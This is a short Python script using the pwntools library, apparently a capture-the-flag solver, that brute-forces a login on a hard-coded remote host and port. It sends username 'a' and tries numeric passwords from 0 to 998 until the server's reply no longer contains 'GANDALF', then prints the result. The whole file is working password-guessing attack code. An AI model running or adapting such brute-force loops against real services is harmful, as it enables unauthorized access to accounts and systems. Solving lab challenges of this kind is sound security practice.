#!/usr/bin/env python

from pwn import *
# 139.162.3.235 1111
context.log_level = 'error'

for s in range(0, 999):
    r = remote('139.162.3.235', 1111)
    print(s)
    # username
    r.send('a\n')
    r.recvline()
    # password
    r.send('%d\n' % (s, ))

    res = r.recvline()

    if res.find('GANDALF') == -1:
        print(res)
        break

    r.close();
